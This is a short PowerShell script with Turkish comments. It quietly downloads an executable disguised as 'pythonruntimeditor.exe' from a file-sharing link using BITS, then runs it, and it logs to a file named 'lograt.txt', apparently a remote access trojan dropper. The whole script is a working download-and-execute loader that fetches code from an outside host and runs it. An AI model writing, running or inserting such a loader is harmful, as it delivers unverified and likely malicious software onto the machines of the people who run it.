# Ayarlar
$exeUrl = "https://store10.gofile.io/download/web/f251cd75-0191-4927-9a7b-2035446b5c3d/pythonruntimeditor.exe"
$localPath = "$env:USERPROFILE\Downloads\pythonruntimeditor.exe"
$logFile = "$env:USERPROFILE\Downloads\lograt.txt"

# Log fonksiyonu
function Log-Message {
    param([string]$msg)
    Add-Content -Path $logFile -Value ("[$(Get-Date -Format 'HH:mm:ss')] $msg")
}

try {
    Log-Message "BITS transfer başlatılıyor..."

    # Sessiz, stabil indirme başlasın
    Start-BitsTransfer -Source $exeUrl -Destination $localPath -ErrorAction Stop

    Log-Message "İndirme tamamlandı: $localPath"

    # Dosyayı çalıştır
    Log-Message "Dosya çalıştırılıyor..."
    Start-Process -FilePath $localPath -WindowStyle Normal
} catch {
    Log-Message "HATA: $($_.Exception.Message)"
}
